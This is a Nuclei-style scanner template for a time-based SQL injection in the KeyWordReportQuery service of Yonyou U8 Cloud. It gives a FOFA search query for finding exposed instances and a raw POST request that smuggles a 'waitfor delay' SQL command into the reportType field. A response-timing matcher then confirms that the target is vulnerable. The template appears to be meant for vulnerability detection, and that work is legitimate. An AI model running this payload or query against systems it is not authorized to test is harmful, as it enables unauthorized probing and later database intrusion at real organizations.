id: yonyou-u8-cloud-KeyWordReportQuery-sqli
info:
  name: 用友 U8 Cloud KeyWordReportQuery - sqli
  author: leadlife
  severity: high
  description: todo
  reference: 
    - https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8BU8-Cloud-KeyWordReportQuery%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
  metadata:
    verified: true
    fofa-query: app="用友-U8-Cloud" || title=="U8C"
  tags: yonyou,u8cloud,sqli,oa,time

http:
  - raw:
      - |
        @timeout: 15s
        POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 0

        {"reportType":"1';waitfor delay '0:0:6'-- ","pageInfo":{"currentPageIndex":1,"pageSize":1},"keyword":[]}

    matchers:
      - type: dsl
        dsl:
          - duration >= 5 && duration < 9
          - status_code == 200
        condition: and